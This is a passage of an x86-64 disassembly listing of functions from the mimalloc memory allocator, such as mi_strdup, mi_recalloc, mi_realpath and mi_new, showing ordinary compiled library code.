  402fe1:	4c 89 e6             	mov    %r12,%rsi
  402fe4:	48 0f 46 d3          	cmovbe %rbx,%rdx
  402fe8:	e8 b3 de ff ff       	callq  400ea0 <memcpy@plt>
  402fed:	4c 89 e7             	mov    %r12,%rdi
  402ff0:	e8 6b ec ff ff       	callq  401c60 <mi_free>
  402ff5:	48 83 c4 08          	add    $0x8,%rsp
  402ff9:	4c 89 e8             	mov    %r13,%rax
  402ffc:	5b                   	pop    %rbx
  402ffd:	5d                   	pop    %rbp
  402ffe:	41 5c                	pop    %r12
  403000:	41 5d                	pop    %r13
  403002:	c3                   	retq   
  403003:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  403008:	41 c6 45 00 00       	movb   $0x0,0x0(%r13)
  40300d:	eb c4                	jmp    402fd3 <mi_rezalloc+0xc3>
  40300f:	90                   	nop
  403010:	48 83 fd 08          	cmp    $0x8,%rbp
  403014:	bf 08 00 00 00       	mov    $0x8,%edi
  403019:	48 89 da             	mov    %rbx,%rdx
  40301c:	48 0f 43 fd          	cmovae %rbp,%rdi
  403020:	31 f6                	xor    %esi,%esi
  403022:	48 83 ef 08          	sub    $0x8,%rdi
  403026:	48 29 fa             	sub    %rdi,%rdx
  403029:	4c 01 ef             	add    %r13,%rdi
  40302c:	e8 2f de ff ff       	callq  400e60 <memset@plt>
  403031:	eb a0                	jmp    402fd3 <mi_rezalloc+0xc3>
  403033:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  403038:	31 c9                	xor    %ecx,%ecx
  40303a:	31 d2                	xor    %edx,%edx
  40303c:	48 89 de             	mov    %rbx,%rsi
  40303f:	4c 89 c7             	mov    %r8,%rdi
  403042:	e8 29 c1 00 00       	callq  40f170 <_mi_malloc_generic>
  403047:	49 89 c5             	mov    %rax,%r13
  40304a:	48 85 c0             	test   %rax,%rax
  40304d:	74 a6                	je     402ff5 <mi_rezalloc+0xe5>
  40304f:	e9 75 ff ff ff       	jmpq   402fc9 <mi_rezalloc+0xb9>
  403054:	0f 1f 40 00          	nopl   0x0(%rax)
  403058:	48 d1 e8             	shr    %rax
  40305b:	48 39 c3             	cmp    %rax,%rbx
  40305e:	0f 82 2e ff ff ff    	jb     402f92 <mi_rezalloc+0x82>
  403064:	48 85 db             	test   %rbx,%rbx
  403067:	0f 84 25 ff ff ff    	je     402f92 <mi_rezalloc+0x82>
  40306d:	4d 89 e5             	mov    %r12,%r13
  403070:	e9 80 ff ff ff       	jmpq   402ff5 <mi_rezalloc+0xe5>
  403075:	0f 1f 00             	nopl   (%rax)
  403078:	4c 89 e6             	mov    %r12,%rsi
  40307b:	e8 70 ea ff ff       	callq  401af0 <mi_page_usable_aligned_size_of>
  403080:	48 89 c5             	mov    %rax,%rbp
  403083:	e9 e6 fe ff ff       	jmpq   402f6e <mi_rezalloc+0x5e>
  403088:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40308f:	00 

0000000000403090 <mi_recalloc>:
  403090:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  403097:	49 89 f8             	mov    %rdi,%r8
  40309a:	64 48 8b 38          	mov    %fs:(%rax),%rdi
  40309e:	48 83 fe 01          	cmp    $0x1,%rsi
  4030a2:	74 0b                	je     4030af <mi_recalloc+0x1f>
  4030a4:	48 89 f0             	mov    %rsi,%rax
  4030a7:	48 f7 e2             	mul    %rdx
  4030aa:	48 89 c2             	mov    %rax,%rdx
  4030ad:	70 11                	jo     4030c0 <mi_recalloc+0x30>
  4030af:	b9 01 00 00 00       	mov    $0x1,%ecx
  4030b4:	4c 89 c6             	mov    %r8,%rsi
  4030b7:	e9 64 f7 ff ff       	jmpq   402820 <_mi_heap_realloc_zero>
  4030bc:	0f 1f 40 00          	nopl   0x0(%rax)
  4030c0:	31 c0                	xor    %eax,%eax
  4030c2:	c3                   	retq   
  4030c3:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  4030ca:	00 00 00 00 
  4030ce:	66 90                	xchg   %ax,%ax

00000000004030d0 <mi_heap_strdup>:
  4030d0:	48 85 f6             	test   %rsi,%rsi
  4030d3:	0f 84 87 00 00 00    	je     403160 <mi_heap_strdup+0x90>
  4030d9:	41 54                	push   %r12
  4030db:	49 89 fc             	mov    %rdi,%r12
  4030de:	48 89 f7             	mov    %rsi,%rdi
  4030e1:	55                   	push   %rbp
  4030e2:	53                   	push   %rbx
  4030e3:	48 89 f3             	mov    %rsi,%rbx
  4030e6:	e8 a5 50 00 00       	callq  408190 <_mi_strlen>
  4030eb:	48 8d 70 01          	lea    0x1(%rax),%rsi
  4030ef:	48 89 c5             	mov    %rax,%rbp
  4030f2:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  4030f9:	77 45                	ja     403140 <mi_heap_strdup+0x70>
  4030fb:	48 8d 40 08          	lea    0x8(%rax),%rax
  4030ff:	48 c1 e8 03          	shr    $0x3,%rax
  403103:	49 8b 84 c4 f8 00 00 	mov    0xf8(%r12,%rax,8),%rax
  40310a:	00 
  40310b:	48 8b 48 10          	mov    0x10(%rax),%rcx
  40310f:	48 85 c9             	test   %rcx,%rcx
  403112:	74 2e                	je     403142 <mi_heap_strdup+0x72>
  403114:	48 8b 11             	mov    (%rcx),%rdx
  403117:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  40311c:	48 89 50 10          	mov    %rdx,0x10(%rax)
  403120:	48 89 ea             	mov    %rbp,%rdx
  403123:	48 89 de             	mov    %rbx,%rsi
  403126:	48 89 cf             	mov    %rcx,%rdi
  403129:	e8 72 dd ff ff       	callq  400ea0 <memcpy@plt>
  40312e:	48 89 c1             	mov    %rax,%rcx
  403131:	c6 04 28 00          	movb   $0x0,(%rax,%rbp,1)
  403135:	5b                   	pop    %rbx
  403136:	48 89 c8             	mov    %rcx,%rax
  403139:	5d                   	pop    %rbp
  40313a:	41 5c                	pop    %r12
  40313c:	c3                   	retq   
  40313d:	0f 1f 00             	nopl   (%rax)
  403140:	31 c9                	xor    %ecx,%ecx
  403142:	31 d2                	xor    %edx,%edx
  403144:	4c 89 e7             	mov    %r12,%rdi
  403147:	e8 24 c0 00 00       	callq  40f170 <_mi_malloc_generic>
  40314c:	48 89 c1             	mov    %rax,%rcx
  40314f:	48 85 c0             	test   %rax,%rax
  403152:	75 cc                	jne    403120 <mi_heap_strdup+0x50>
  403154:	31 c9                	xor    %ecx,%ecx
  403156:	5b                   	pop    %rbx
  403157:	5d                   	pop    %rbp
  403158:	48 89 c8             	mov    %rcx,%rax
  40315b:	41 5c                	pop    %r12
  40315d:	c3                   	retq   
  40315e:	66 90                	xchg   %ax,%ax
  403160:	31 c9                	xor    %ecx,%ecx
  403162:	48 89 c8             	mov    %rcx,%rax
  403165:	c3                   	retq   
  403166:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40316d:	00 00 00 

0000000000403170 <mi_strdup>:
  403170:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  403177:	41 54                	push   %r12
  403179:	55                   	push   %rbp
  40317a:	53                   	push   %rbx
  40317b:	64 4c 8b 20          	mov    %fs:(%rax),%r12
  40317f:	48 85 ff             	test   %rdi,%rdi
  403182:	74 70                	je     4031f4 <mi_strdup+0x84>
  403184:	48 89 fb             	mov    %rdi,%rbx
  403187:	e8 04 50 00 00       	callq  408190 <_mi_strlen>
  40318c:	48 8d 70 01          	lea    0x1(%rax),%rsi
  403190:	48 89 c5             	mov    %rax,%rbp
  403193:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  40319a:	77 44                	ja     4031e0 <mi_strdup+0x70>
  40319c:	48 8d 40 08          	lea    0x8(%rax),%rax
  4031a0:	48 c1 e8 03          	shr    $0x3,%rax
  4031a4:	49 8b 84 c4 f8 00 00 	mov    0xf8(%r12,%rax,8),%rax
  4031ab:	00 
  4031ac:	48 8b 48 10          	mov    0x10(%rax),%rcx
  4031b0:	48 85 c9             	test   %rcx,%rcx
  4031b3:	74 2d                	je     4031e2 <mi_strdup+0x72>
  4031b5:	48 8b 11             	mov    (%rcx),%rdx
  4031b8:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  4031bd:	48 89 50 10          	mov    %rdx,0x10(%rax)
  4031c1:	48 89 ea             	mov    %rbp,%rdx
  4031c4:	48 89 de             	mov    %rbx,%rsi
  4031c7:	48 89 cf             	mov    %rcx,%rdi
  4031ca:	e8 d1 dc ff ff       	callq  400ea0 <memcpy@plt>
  4031cf:	48 89 c1             	mov    %rax,%rcx
  4031d2:	c6 04 28 00          	movb   $0x0,(%rax,%rbp,1)
  4031d6:	5b                   	pop    %rbx
  4031d7:	48 89 c8             	mov    %rcx,%rax
  4031da:	5d                   	pop    %rbp
  4031db:	41 5c                	pop    %r12
  4031dd:	c3                   	retq   
  4031de:	66 90                	xchg   %ax,%ax
  4031e0:	31 c9                	xor    %ecx,%ecx
  4031e2:	31 d2                	xor    %edx,%edx
  4031e4:	4c 89 e7             	mov    %r12,%rdi
  4031e7:	e8 84 bf 00 00       	callq  40f170 <_mi_malloc_generic>
  4031ec:	48 89 c1             	mov    %rax,%rcx
  4031ef:	48 85 c0             	test   %rax,%rax
  4031f2:	75 cd                	jne    4031c1 <mi_strdup+0x51>
  4031f4:	31 c9                	xor    %ecx,%ecx
  4031f6:	5b                   	pop    %rbx
  4031f7:	5d                   	pop    %rbp
  4031f8:	48 89 c8             	mov    %rcx,%rax
  4031fb:	41 5c                	pop    %r12
  4031fd:	c3                   	retq   
  4031fe:	66 90                	xchg   %ax,%ax

0000000000403200 <mi_heap_strndup>:
  403200:	48 85 f6             	test   %rsi,%rsi
  403203:	0f 84 87 00 00 00    	je     403290 <mi_heap_strndup+0x90>
  403209:	41 54                	push   %r12
  40320b:	49 89 f4             	mov    %rsi,%r12
  40320e:	48 89 d6             	mov    %rdx,%rsi
  403211:	55                   	push   %rbp
  403212:	48 89 fd             	mov    %rdi,%rbp
  403215:	4c 89 e7             	mov    %r12,%rdi
  403218:	53                   	push   %rbx
  403219:	e8 a2 4f 00 00       	callq  4081c0 <_mi_strnlen>
  40321e:	48 8d 70 01          	lea    0x1(%rax),%rsi
  403222:	48 89 c3             	mov    %rax,%rbx
  403225:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  40322c:	77 42                	ja     403270 <mi_heap_strndup+0x70>
  40322e:	48 8d 40 08          	lea    0x8(%rax),%rax
  403232:	48 c1 e8 03          	shr    $0x3,%rax
  403236:	48 8b 84 c5 f8 00 00 	mov    0xf8(%rbp,%rax,8),%rax
  40323d:	00 
  40323e:	48 8b 48 10          	mov    0x10(%rax),%rcx
  403242:	48 85 c9             	test   %rcx,%rcx
  403245:	74 2b                	je     403272 <mi_heap_strndup+0x72>
  403247:	48 8b 11             	mov    (%rcx),%rdx
  40324a:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  40324f:	48 89 50 10          	mov    %rdx,0x10(%rax)
  403253:	48 89 da             	mov    %rbx,%rdx
  403256:	4c 89 e6             	mov    %r12,%rsi
  403259:	48 89 cf             	mov    %rcx,%rdi
  40325c:	e8 3f dc ff ff       	callq  400ea0 <memcpy@plt>
  403261:	48 89 c1             	mov    %rax,%rcx
  403264:	c6 04 18 00          	movb   $0x0,(%rax,%rbx,1)
  403268:	5b                   	pop    %rbx
  403269:	48 89 c8             	mov    %rcx,%rax
  40326c:	5d                   	pop    %rbp
  40326d:	41 5c                	pop    %r12
  40326f:	c3                   	retq   
  403270:	31 c9                	xor    %ecx,%ecx
  403272:	31 d2                	xor    %edx,%edx
  403274:	48 89 ef             	mov    %rbp,%rdi
  403277:	e8 f4 be 00 00       	callq  40f170 <_mi_malloc_generic>
  40327c:	48 89 c1             	mov    %rax,%rcx
  40327f:	48 85 c0             	test   %rax,%rax
  403282:	75 cf                	jne    403253 <mi_heap_strndup+0x53>
  403284:	31 c9                	xor    %ecx,%ecx
  403286:	5b                   	pop    %rbx
  403287:	5d                   	pop    %rbp
  403288:	48 89 c8             	mov    %rcx,%rax
  40328b:	41 5c                	pop    %r12
  40328d:	c3                   	retq   
  40328e:	66 90                	xchg   %ax,%ax
  403290:	31 c9                	xor    %ecx,%ecx
  403292:	48 89 c8             	mov    %rcx,%rax
  403295:	c3                   	retq   
  403296:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40329d:	00 00 00 

00000000004032a0 <mi_strndup>:
  4032a0:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  4032a7:	41 54                	push   %r12
  4032a9:	55                   	push   %rbp
  4032aa:	53                   	push   %rbx
  4032ab:	64 4c 8b 20          	mov    %fs:(%rax),%r12
  4032af:	48 85 ff             	test   %rdi,%rdi
  4032b2:	74 70                	je     403324 <mi_strndup+0x84>
  4032b4:	48 89 fb             	mov    %rdi,%rbx
  4032b7:	e8 04 4f 00 00       	callq  4081c0 <_mi_strnlen>
  4032bc:	48 8d 70 01          	lea    0x1(%rax),%rsi
  4032c0:	48 89 c5             	mov    %rax,%rbp
  4032c3:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  4032ca:	77 44                	ja     403310 <mi_strndup+0x70>
  4032cc:	48 8d 40 08          	lea    0x8(%rax),%rax
  4032d0:	48 c1 e8 03          	shr    $0x3,%rax
  4032d4:	49 8b 84 c4 f8 00 00 	mov    0xf8(%r12,%rax,8),%rax
  4032db:	00 
  4032dc:	48 8b 48 10          	mov    0x10(%rax),%rcx
  4032e0:	48 85 c9             	test   %rcx,%rcx
  4032e3:	74 2d                	je     403312 <mi_strndup+0x72>
  4032e5:	48 8b 11             	mov    (%rcx),%rdx
  4032e8:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  4032ed:	48 89 50 10          	mov    %rdx,0x10(%rax)
  4032f1:	48 89 ea             	mov    %rbp,%rdx
  4032f4:	48 89 de             	mov    %rbx,%rsi
  4032f7:	48 89 cf             	mov    %rcx,%rdi
  4032fa:	e8 a1 db ff ff       	callq  400ea0 <memcpy@plt>
  4032ff:	48 89 c1             	mov    %rax,%rcx
  403302:	c6 04 28 00          	movb   $0x0,(%rax,%rbp,1)
  403306:	5b                   	pop    %rbx
  403307:	48 89 c8             	mov    %rcx,%rax
  40330a:	5d                   	pop    %rbp
  40330b:	41 5c                	pop    %r12
  40330d:	c3                   	retq   
  40330e:	66 90                	xchg   %ax,%ax
  403310:	31 c9                	xor    %ecx,%ecx
  403312:	31 d2                	xor    %edx,%edx
  403314:	4c 89 e7             	mov    %r12,%rdi
  403317:	e8 54 be 00 00       	callq  40f170 <_mi_malloc_generic>
  40331c:	48 89 c1             	mov    %rax,%rcx
  40331f:	48 85 c0             	test   %rax,%rax
  403322:	75 cd                	jne    4032f1 <mi_strndup+0x51>
  403324:	31 c9                	xor    %ecx,%ecx
  403326:	5b                   	pop    %rbx
  403327:	5d                   	pop    %rbp
  403328:	48 89 c8             	mov    %rcx,%rax
  40332b:	41 5c                	pop    %r12
  40332d:	c3                   	retq   
  40332e:	66 90                	xchg   %ax,%ax

0000000000403330 <mi_heap_realpath>:
  403330:	48 89 f0             	mov    %rsi,%rax
  403333:	48 85 d2             	test   %rdx,%rdx
  403336:	74 10                	je     403348 <mi_heap_realpath+0x18>
  403338:	48 89 d6             	mov    %rdx,%rsi
  40333b:	48 89 c7             	mov    %rax,%rdi
  40333e:	e9 4d db ff ff       	jmpq   400e90 <realpath@plt>
  403343:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  403348:	41 54                	push   %r12
  40334a:	31 f6                	xor    %esi,%esi
  40334c:	45 31 e4             	xor    %r12d,%r12d
  40334f:	55                   	push   %rbp
  403350:	53                   	push   %rbx
  403351:	48 89 fb             	mov    %rdi,%rbx
  403354:	48 89 c7             	mov    %rax,%rdi
  403357:	e8 34 db ff ff       	callq  400e90 <realpath@plt>
  40335c:	48 89 c5             	mov    %rax,%rbp
  40335f:	48 85 c0             	test   %rax,%rax
  403362:	74 16                	je     40337a <mi_heap_realpath+0x4a>
  403364:	48 89 df             	mov    %rbx,%rdi
  403367:	48 89 c6             	mov    %rax,%rsi
  40336a:	e8 61 fd ff ff       	callq  4030d0 <mi_heap_strdup>
  40336f:	48 89 ef             	mov    %rbp,%rdi
  403372:	49 89 c4             	mov    %rax,%r12
  403375:	e8 a6 1d 00 00       	callq  405120 <mi_cfree>
  40337a:	4c 89 e0             	mov    %r12,%rax
  40337d:	5b                   	pop    %rbx
  40337e:	5d                   	pop    %rbp
  40337f:	41 5c                	pop    %r12
  403381:	c3                   	retq   
  403382:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  403389:	00 00 00 00 
  40338d:	0f 1f 00             	nopl   (%rax)

0000000000403390 <mi_realpath>:
  403390:	48 85 f6             	test   %rsi,%rsi
  403393:	74 0b                	je     4033a0 <mi_realpath+0x10>
  403395:	e9 f6 da ff ff       	jmpq   400e90 <realpath@plt>
  40339a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4033a0:	41 54                	push   %r12
  4033a2:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  4033a9:	31 f6                	xor    %esi,%esi
  4033ab:	55                   	push   %rbp
  4033ac:	31 ed                	xor    %ebp,%ebp
  4033ae:	53                   	push   %rbx
  4033af:	64 4c 8b 20          	mov    %fs:(%rax),%r12
  4033b3:	e8 d8 da ff ff       	callq  400e90 <realpath@plt>
  4033b8:	48 89 c3             	mov    %rax,%rbx
  4033bb:	48 85 c0             	test   %rax,%rax
  4033be:	74 16                	je     4033d6 <mi_realpath+0x46>
  4033c0:	4c 89 e7             	mov    %r12,%rdi
  4033c3:	48 89 c6             	mov    %rax,%rsi
  4033c6:	e8 05 fd ff ff       	callq  4030d0 <mi_heap_strdup>
  4033cb:	48 89 df             	mov    %rbx,%rdi
  4033ce:	48 89 c5             	mov    %rax,%rbp
  4033d1:	e8 4a 1d 00 00       	callq  405120 <mi_cfree>
  4033d6:	48 89 e8             	mov    %rbp,%rax
  4033d9:	5b                   	pop    %rbx
  4033da:	5d                   	pop    %rbp
  4033db:	41 5c                	pop    %r12
  4033dd:	c3                   	retq   
  4033de:	66 90                	xchg   %ax,%ax

00000000004033e0 <_ZSt15get_new_handlerv>:
  4033e0:	31 c0                	xor    %eax,%eax
  4033e2:	c3                   	retq   
  4033e3:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  4033ea:	00 00 00 00 
  4033ee:	66 90                	xchg   %ax,%ax

00000000004033f0 <mi_heap_try_new>:
  4033f0:	41 55                	push   %r13
  4033f2:	41 89 d5             	mov    %edx,%r13d
  4033f5:	41 54                	push   %r12
  4033f7:	49 89 f4             	mov    %rsi,%r12
  4033fa:	55                   	push   %rbp
  4033fb:	48 8d 6e 07          	lea    0x7(%rsi),%rbp
  4033ff:	53                   	push   %rbx
  403400:	48 c1 ed 03          	shr    $0x3,%rbp
  403404:	48 89 fb             	mov    %rdi,%rbx
  403407:	48 83 c5 1e          	add    $0x1e,%rbp
  40340b:	48 83 ec 08          	sub    $0x8,%rsp
  40340f:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  403416:	77 56                	ja     40346e <mi_heap_try_new+0x7e>
  403418:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40341f:	00 
  403420:	e8 bb ff ff ff       	callq  4033e0 <_ZSt15get_new_handlerv>
  403425:	48 85 c0             	test   %rax,%rax
  403428:	74 56                	je     403480 <mi_heap_try_new+0x90>
  40342a:	ff d0                	callq  *%rax
  40342c:	48 8b 54 eb 08       	mov    0x8(%rbx,%rbp,8),%rdx
  403431:	48 8b 42 10          	mov    0x10(%rdx),%rax
  403435:	48 85 c0             	test   %rax,%rax
  403438:	74 76                	je     4034b0 <mi_heap_try_new+0xc0>
  40343a:	48 8b 08             	mov    (%rax),%rcx
  40343d:	66 83 42 20 01       	addw   $0x1,0x20(%rdx)
  403442:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  403446:	48 83 c4 08          	add    $0x8,%rsp
  40344a:	5b                   	pop    %rbx
  40344b:	5d                   	pop    %rbp
  40344c:	41 5c                	pop    %r12
  40344e:	41 5d                	pop    %r13
  403450:	c3                   	retq   
  403451:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  403458:	ff d0                	callq  *%rax
  40345a:	31 c9                	xor    %ecx,%ecx
  40345c:	31 d2                	xor    %edx,%edx
  40345e:	4c 89 e6             	mov    %r12,%rsi
  403461:	48 89 df             	mov    %rbx,%rdi
  403464:	e8 07 bd 00 00       	callq  40f170 <_mi_malloc_generic>
  403469:	48 85 c0             	test   %rax,%rax
  40346c:	75 d8                	jne    403446 <mi_heap_try_new+0x56>
  40346e:	e8 6d ff ff ff       	callq  4033e0 <_ZSt15get_new_handlerv>
  403473:	48 85 c0             	test   %rax,%rax
  403476:	75 e0                	jne    403458 <mi_heap_try_new+0x68>
  403478:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40347f:	00 
  403480:	31 c0                	xor    %eax,%eax
  403482:	48 8d 35 09 85 01 00 	lea    0x18509(%rip),%rsi        # 41b992 <__PRETTY_FUNCTION__.26319+0x12>
  403489:	bf 0c 00 00 00       	mov    $0xc,%edi
  40348e:	e8 ed 62 00 00       	callq  409780 <_mi_error_message>
  403493:	45 84 ed             	test   %r13b,%r13b
  403496:	0f 84 04 db ff ff    	je     400fa0 <mi_heap_try_new.cold.22>
  40349c:	48 83 c4 08          	add    $0x8,%rsp
  4034a0:	31 c0                	xor    %eax,%eax
  4034a2:	5b                   	pop    %rbx
  4034a3:	5d                   	pop    %rbp
  4034a4:	41 5c                	pop    %r12
  4034a6:	41 5d                	pop    %r13
  4034a8:	c3                   	retq   
  4034a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4034b0:	31 c9                	xor    %ecx,%ecx
  4034b2:	31 d2                	xor    %edx,%edx
  4034b4:	4c 89 e6             	mov    %r12,%rsi
  4034b7:	48 89 df             	mov    %rbx,%rdi
  4034ba:	e8 b1 bc 00 00       	callq  40f170 <_mi_malloc_generic>
  4034bf:	48 85 c0             	test   %rax,%rax
  4034c2:	0f 84 58 ff ff ff    	je     403420 <mi_heap_try_new+0x30>
  4034c8:	e9 79 ff ff ff       	jmpq   403446 <mi_heap_try_new+0x56>
  4034cd:	0f 1f 00             	nopl   (%rax)

00000000004034d0 <mi_try_new.constprop.16>:
  4034d0:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  4034d7:	48 89 fe             	mov    %rdi,%rsi
  4034da:	ba 01 00 00 00       	mov    $0x1,%edx
  4034df:	64 48 8b 38          	mov    %fs:(%rax),%rdi
  4034e3:	e9 08 ff ff ff       	jmpq   4033f0 <mi_heap_try_new>
  4034e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4034ef:	00 

00000000004034f0 <mi_heap_alloc_new>:
  4034f0:	55                   	push   %rbp
  4034f1:	48 89 fd             	mov    %rdi,%rbp
  4034f4:	53                   	push   %rbx
  4034f5:	48 89 f3             	mov    %rsi,%rbx
  4034f8:	48 83 ec 08          	sub    $0x8,%rsp
  4034fc:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  403503:	77 33                	ja     403538 <mi_heap_alloc_new+0x48>
  403505:	48 8d 46 07          	lea    0x7(%rsi),%rax
  403509:	48 c1 e8 03          	shr    $0x3,%rax
  40350d:	48 8b 94 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%rdx
  403514:	00 
  403515:	48 8b 42 10          	mov    0x10(%rdx),%rax
  403519:	48 85 c0             	test   %rax,%rax
  40351c:	74 1a                	je     403538 <mi_heap_alloc_new+0x48>
  40351e:	48 8b 08             	mov    (%rax),%rcx
  403521:	66 83 42 20 01       	addw   $0x1,0x20(%rdx)
  403526:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  40352a:	48 83 c4 08          	add    $0x8,%rsp
  40352e:	5b                   	pop    %rbx
  40352f:	5d                   	pop    %rbp
  403530:	c3                   	retq   
  403531:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  403538:	31 c9                	xor    %ecx,%ecx
  40353a:	31 d2                	xor    %edx,%edx
  40353c:	48 89 de             	mov    %rbx,%rsi
  40353f:	48 89 ef             	mov    %rbp,%rdi
  403542:	e8 29 bc 00 00       	callq  40f170 <_mi_malloc_generic>
  403547:	48 85 c0             	test   %rax,%rax
  40354a:	75 de                	jne    40352a <mi_heap_alloc_new+0x3a>
  40354c:	48 83 c4 08          	add    $0x8,%rsp
  403550:	48 89 de             	mov    %rbx,%rsi
  403553:	48 89 ef             	mov    %rbp,%rdi
  403556:	31 d2                	xor    %edx,%edx
  403558:	5b                   	pop    %rbx
  403559:	5d                   	pop    %rbp
  40355a:	e9 91 fe ff ff       	jmpq   4033f0 <mi_heap_try_new>
  40355f:	90                   	nop

0000000000403560 <mi_new>:
  403560:	55                   	push   %rbp
  403561:	53                   	push   %rbx
  403562:	48 89 fb             	mov    %rdi,%rbx
  403565:	48 83 ec 08          	sub    $0x8,%rsp
  403569:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  403570:	64 48 8b 28          	mov    %fs:(%rax),%rbp
  403574:	48 81 ff 00 04 00 00 	cmp    $0x400,%rdi
  40357b:	77 33                	ja     4035b0 <mi_new+0x50>
  40357d:	48 8d 47 07          	lea    0x7(%rdi),%rax
  403581:	48 c1 e8 03          	shr    $0x3,%rax
  403585:	48 8b 94 c5 f8 00 00 	mov    0xf8(%rbp,%rax,8),%rdx
  40358c:	00 
  40358d:	48 8b 42 10          	mov    0x10(%rdx),%rax
  403591:	48 85 c0             	test   %rax,%rax
  403594:	74 1a                	je     4035b0 <mi_new+0x50>
  403596:	48 8b 08             	mov    (%rax),%rcx
  403599:	66 83 42 20 01       	addw   $0x1,0x20(%rdx)
  40359e:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  4035a2:	48 83 c4 08          	add    $0x8,%rsp
  4035a6:	5b                   	pop    %rbx
  4035a7:	5d                   	pop    %rbp
  4035a8:	c3                   	retq   
  4035a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4035b0:	31 c9                	xor    %ecx,%ecx
  4035b2:	31 d2                	xor    %edx,%edx
  4035b4:	48 89 de             	mov    %rbx,%rsi
  4035b7:	48 89 ef             	mov    %rbp,%rdi
  4035ba:	e8 b1 bb 00 00       	callq  40f170 <_mi_malloc_generic>
  4035bf:	48 85 c0             	test   %rax,%rax
  4035c2:	75 de                	jne    4035a2 <mi_new+0x42>
  4035c4:	48 83 c4 08          	add    $0x8,%rsp
  4035c8:	48 89 de             	mov    %rbx,%rsi
  4035cb:	48 89 ef             	mov    %rbp,%rdi
  4035ce:	31 d2                	xor    %edx,%edx
  4035d0:	5b                   	pop    %rbx
  4035d1:	5d                   	pop    %rbp
  4035d2:	e9 19 fe ff ff       	jmpq   4033f0 <mi_heap_try_new>
  4035d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4035de:	00 00 

00000000004035e0 <mi_heap_alloc_new_n>:
  4035e0:	55                   	push   %rbp
  4035e1:	48 89 fd             	mov    %rdi,%rbp
  4035e4:	53                   	push   %rbx
  4035e5:	48 89 d3             	mov    %rdx,%rbx
  4035e8:	48 83 ec 08          	sub    $0x8,%rsp
  4035ec:	48 83 fe 01          	cmp    $0x1,%rsi
  4035f0:	74 0b                	je     4035fd <mi_heap_alloc_new_n+0x1d>
  4035f2:	48 89 f0             	mov    %rsi,%rax
  4035f5:	48 f7 e3             	mul    %rbx
  4035f8:	48 89 c3             	mov    %rax,%rbx
  4035fb:	70 63                	jo     403660 <mi_heap_alloc_new_n+0x80>
  4035fd:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
  403604:	77 32                	ja     403638 <mi_heap_alloc_new_n+0x58>
  403606:	48 8d 43 07          	lea    0x7(%rbx),%rax
  40360a:	48 c1 e8 03          	shr    $0x3,%rax
  40360e:	48 8b 94 c5 f8 00 00 	mov    0xf8(%rbp,%rax,8),%rdx
  403615:	00 
  403616:	48 8b 42 10          	mov    0x10(%rdx),%rax
  40361a:	48 85 c0             	test   %rax,%rax
  40361d:	74 19                	je     403638 <mi_heap_alloc_new_n+0x58>
  40361f:	48 8b 08             	mov    (%rax),%rcx
  403622:	66 83 42 20 01       	addw   $0x1,0x20(%rdx)
  403627:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  40362b:	48 83 c4 08          	add    $0x8,%rsp
  40362f:	5b                   	pop    %rbx
  403630:	5d                   	pop    %rbp
  403631:	c3                   	retq   
  403632:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403638:	31 c9                	xor    %ecx,%ecx
  40363a:	31 d2                	xor    %edx,%edx
  40363c:	48 89 de             	mov    %rbx,%rsi
  40363f:	48 89 ef             	mov    %rbp,%rdi
  403642:	e8 29 bb 00 00       	callq  40f170 <_mi_malloc_generic>
  403647:	48 85 c0             	test   %rax,%rax
  40364a:	75 df                	jne    40362b <mi_heap_alloc_new_n+0x4b>
  40364c:	48 83 c4 08          	add    $0x8,%rsp
  403650:	48 89 de             	mov    %rbx,%rsi
  403653:	48 89 ef             	mov    %rbp,%rdi
  403656:	31 d2                	xor    %edx,%edx
  403658:	5b                   	pop    %rbx
  403659:	5d                   	pop    %rbp
  40365a:	e9 91 fd ff ff       	jmpq   4033f0 <mi_heap_try_new>
  40365f:	90                   	nop
  403660:	e8 7b fd ff ff       	callq  4033e0 <_ZSt15get_new_handlerv>
